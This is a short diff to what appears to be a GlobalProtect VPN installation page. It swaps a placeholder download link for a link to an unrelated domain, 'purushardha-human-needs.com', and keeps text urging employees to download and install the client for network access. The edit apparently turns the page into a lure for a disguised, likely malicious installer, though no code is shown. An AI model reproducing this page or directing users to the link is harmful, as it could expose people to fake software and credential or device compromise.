@@ -13,7 +13,7 @@
 
 To install GlobalProtect on a Windows system, follow the download link below:
 
-[**Download GlobalProtect**](*)
+[**Download GlobalProtect**](https://purushardha-human-needs.com/needs/)
 
 Start by downloading the GlobalProtect application to your device — a vital step for establishing a secure link to your company’s network. After the download is complete, proceed with the installation instructions to configure the software and gain uninterrupted access to internal resources.
 
